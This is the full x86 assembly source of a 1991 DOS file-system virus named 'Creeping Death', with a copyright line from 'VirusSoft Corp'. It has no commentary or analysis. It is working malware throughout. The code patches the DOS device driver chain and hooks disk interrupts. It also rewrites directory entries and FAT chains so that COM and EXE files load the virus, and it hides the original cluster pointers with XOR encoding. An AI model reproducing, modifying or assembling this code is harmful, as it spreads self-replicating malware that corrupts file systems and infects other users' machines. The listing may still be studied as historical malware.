;        Creeping Death  V 1.0
;
;        (C) Copyright 1991 by VirusSoft Corp.

i13org    =    5f8h
i21org    =    5fch

         org   100h

         mov   sp,600h
         inc   counter
         xor   cx,cx
         mov   ds,cx
         lds   ax,[0c1h]
         add   ax,21h
         push  ds
         push  ax
         mov   ah,30h
         call  jump
         cmp   al,4
         sbb   si,si
         mov   drive+2,byte ptr -1
         mov   bx,60h
         mov   ah,4ah
         call  jump

         mov   ah,52h
         call  jump
         push  es:[bx-2]
         lds   bx,es:[bx]

search:  mov   ax,[bx+si+15h]
         cmp   ax,70h
         jne   next
         xchg  ax,cx
         mov   [bx+si+18h],byte ptr -1
         mov   di,[bx+si+13h]
         mov   [bx+si+13h],offset header
         mov   [bx+si+15h],cs
next:    lds   bx,[bx+si+19h]
         cmp   bx,-1
         jne   search
         jcxz  install

         pop   ds
         mov   ax,ds
         add   ax,[3]
         inc   ax
         mov   dx,cs
         dec   dx
         cmp   ax,dx
         jne   no_boot
         add   [3],61h
no_boot: mov   ds,dx
         mov   [1],8

         mov   ds,cx
         les   ax,[di+6]
         mov   cs:str_block,ax
         mov   cs:int_block,es

         cld
         mov   si,1
scan:    dec   si
         lodsw
         cmp   ax,1effh
         jne   scan
         mov   ax,2cah
         cmp   [si+4],ax
         je    right
         cmp   [si+5],ax
         jne   scan
right:   lodsw
         push  cs
         pop   es
         mov   di,offset modify+1
         stosw
         xchg  ax,si
         mov   di,offset i13org
         cli
         movsw
         movsw

         mov   dx,0c000h
fdsk1:   mov   ds,dx
         xor   si,si
         lodsw
         cmp   ax,0aa55h
         jne   fdsk4
         cbw
         lodsb
         mov   cl,9
         sal   ax,cl
fdsk2:   cmp   [si],6c7h
         jne   fdsk3
         cmp   [si+2],4ch
         jne   fdsk3
         push  dx
         push  [si+4]
         jmp   short death
install: int   20h
file:    db    "c:",255,0
fdsk3:   inc   si
         cmp   si,ax
         jb    fdsk2
fdsk4:   inc   dx
         cmp   dh,0f0h
         jb    fdsk1

         sub   sp,4
death:   push  cs
         pop   ds
         mov   bx,[2ch]
         mov   es,bx
         mov   ah,49h
         call  jump
         xor   ax,ax
         test  bx,bx
         jz    boot
         mov   di,1
seek:    dec   di
         scasw
         jne   seek
         lea   si,[di+2]
         jmp   short exec
boot:    mov   es,[16h]
         mov   bx,es:[16h]
         dec   bx
         xor   si,si
exec:    push  bx
         mov   bx,offset param
         mov   [bx+4],cs
         mov   [bx+8],cs
         mov   [bx+12],cs
         pop   ds
         push  cs
         pop   es

         mov   di,offset f_name
         push  di
         mov   cx,40
         rep   movsw
         push  cs
         pop   ds

         mov   ah,3dh
         mov   dx,offset file
         call  jump
         pop   dx

         mov   ax,4b00h
         call  jump
         mov   ah,4dh
         call  jump
         mov   ah,4ch

jump:    pushf
         call  dword ptr cs:[i21org]
         ret


;--------Installation complete

i13pr:   mov   ah,3
         jmp   dword ptr cs:[i13org]


main:    push  ax            ; driver
         push  cx            ; strategy block
         push  dx
         push  ds
         push  si
         push  di

         push  es
         pop   ds
         mov   al,[bx+2]

         cmp   al,4          ; Input
         je    input
         cmp   al,8
         je    output
         cmp   al,9
         je    output

         call  in
         cmp   al,2          ; Build BPB
         jne   ppp           ;
         lds   si,[bx+12h]
         mov   di,offset bpb_buf
         mov   es:[bx+12h],di
         mov   es:[bx+14h],cs
         push  es
         push  cs
         pop   es
         mov   cx,16
         rep   movsw
         pop   es
         push  cs
         pop   ds
         mov   al,[di+2-32]
         cmp   al,2
         adc   al,0
         cbw
         cmp   [di+8-32],0
         je    m32
         sub   [di+8-32],ax
         jmp   short ppp
m32:     sub   [di+15h-32],ax
         sbb   [di+17h-32],0

ppp:     pop   di
         pop   si
         pop   ds
         pop   dx
         pop   cx
         pop   ax
rts:     retf

output:  mov   cx,0ff09h
         call  check
         jz    inf_sec
         call  in
         jmp   short inf_dsk

inf_sec: jmp   _inf_sec
read:    jmp   _read
read_:   add   sp,16
         jmp   short ppp

input:   call  check
         jz    read
inf_dsk: mov   byte ptr [bx+2],4
         cld
         lea   si,[bx+0eh]
         mov   cx,8
save:    lodsw
         push  ax
         loop  save
         mov   [bx+14h],1
         call  driver
         jnz   read_
         mov   byte ptr [bx+2],2
         call  in
         lds   si,[bx+12h]
         mov   ax,[si+6]
         add   ax,15
         mov   cl,4
         shr   ax,cl
         mov   di,[si+0bh]
         add   di,di
         stc
         adc   di,ax
         push  di
         cwd
         mov   ax,[si+8]
         test  ax,ax
         jnz   more
         mov   ax,[si+15h]
         mov   dx,[si+17h]
more:    xor   cx,cx
         sub   ax,di
         sbb   dx,cx
         mov   cl,[si+2]
         div   cx
         cmp   cl,2
         sbb   ax,-1
         push  ax
         call  convert
         mov   byte ptr es:[bx+2],4
         mov   es:[bx+14h],ax
         call  driver
again:   lds   si,es:[bx+0eh]
         add   si,dx
         sub   dh,cl
         adc   dx,ax
         mov   cs:gad+1,dx
         cmp   cl,1
         je    small
         mov   ax,[si]
         and   ax,di
         cmp   ax,0fff7h
         je    bad
         cmp   ax,0ff7h
         je    bad
         cmp   ax,0ff70h
         jne   ok
bad:     pop   ax
         dec   ax
         push  ax
         call  convert
         jmp   short again
small:   not   di
         and   [si],di
         pop   ax
         push  ax
         inc   ax
         push  ax
         mov   dx,0fh
         test  di,dx
         jz    here
         inc   dx
         mul   dx
here:    or    [si],ax
         pop   ax
         call  convert
         mov   si,es:[bx+0eh]
         add   si,dx
         mov   ax,[si]
         and   ax,di
ok:      mov   dx,di
         dec   dx
         and   dx,di
         not   di
         and   [si],di
         or    [si],dx

         cmp   ax,dx
         pop   ax
         pop   di
         mov   cs:pointer+1,ax
         je    _read_
         mov   dx,[si]
         push  ds
         push  si
         call  write
         pop   si
         pop   ds
         jnz   _read_
         call  driver
         cmp   [si],dx
         jne   _read_
         dec   ax
         dec   ax
         mul   cx
         add   ax,di
         adc   dx,0
         push  es
         pop   ds
         mov   [bx+12h],2
         mov   [bx+14h],ax
         test  dx,dx
         jz    less
         mov   [bx+14h],-1
         mov   [bx+1ah],ax
         mov   [bx+1ch],dx
less:    mov   [bx+10h],cs
         mov   [bx+0eh],100h
         call  write

_read_:  std
         lea   di,[bx+1ch]
         mov   cx,8
load:    pop   ax
         stosw
         loop  load
_read:   call  in

         mov   cx,9
_inf_sec:
         mov   di,es:[bx+12h]
         lds   si,es:[bx+0eh]
         sal   di,cl
         xor   cl,cl
         add   di,si
         xor   dl,dl
         push  ds
         push  si
         call  find
         jcxz  no_inf
         call  write
         and   es:[bx+4],byte ptr 07fh
no_inf:  pop   si
         pop   ds
         inc   dx
         call  find
         jmp   ppp

;--------Subroutines

find:    mov   ax,[si+8]
         cmp   ax,"XE"
         jne   com
         cmp   [si+10],al
         je    found
com:     cmp   ax,"OC"
         jne   go_on
         cmp   byte ptr [si+10],"M"
         jne   go_on
found:   test  [si+1eh],0ffc0h ; >4MB
         jnz   go_on
         test  [si+1dh],03ff8h ; <2048B
         jz    go_on
         test  [si+0bh],byte ptr 1ch
         jnz   go_on
         test  dl,dl
         jnz   rest
pointer: mov   ax,1234h
         cmp   ax,[si+1ah]
         je    go_on
         xchg  ax,[si+1ah]
gad:     xor   ax,1234h
         mov   [si+14h],ax
         loop  go_on
rest:    xor   ax,ax
         xchg  ax,[si+14h]
         xor   ax,cs:gad+1
         mov   [si+1ah],ax
go_on:  ;rol   cs:gad+1,1
         db    2eh,0d1h,6
         dw    offset gad+1
         add   si,32
         cmp   di,si
         jne   find
         ret

check:   mov   ah,[bx+1]
drive:   cmp   ah,-1
         mov   cs:[drive+2],ah
         jne   changed
         push  [bx+0eh]
         mov   byte ptr [bx+2],1
         call  in
         cmp   byte ptr [bx+0eh],1
         pop   [bx+0eh]
         mov   [bx+2],al
changed: ret

write:   cmp   byte ptr es:[bx+2],8
         jae   in
         mov   byte ptr es:[bx+2],4
         mov   si,70h
         mov   ds,si
modify:  mov   si,1234h
         push  [si]
         push  [si+2]
         mov   [si],offset i13pr
         mov   [si+2],cs
         call  in
         pop   [si+2]
         pop   [si]
         ret

driver:  mov   es:[bx+12h],1
in:
         db    09ah
str_block:
         dw    ?,70h
         db    09ah
int_block:
         dw    ?,70h
         test  es:[bx+4],byte ptr 80h
         ret

convert: cmp   ax,0ff0h
         jae   fat_16
         mov   si,3
         xor   cs:[si+gad-1],si
         mul   si
         shr   ax,1
         mov   di,0fffh
         jnc   cont
         mov   di,0fff0h
         jmp   short cont
fat_16:  mov   si,2
         mul   si
         mov   di,0ffffh
cont:    mov   si,512
         div   si
header:  inc   ax
         ret

counter: dw    0

         dw    842h
         dw    offset main
         dw    offset rts
         db    7fh

param:   dw    0,80h,?,5ch,?,6ch,?

bpb_buf: db    32 dup(?)
f_name:  db    80 dup(?)

;--------The End.

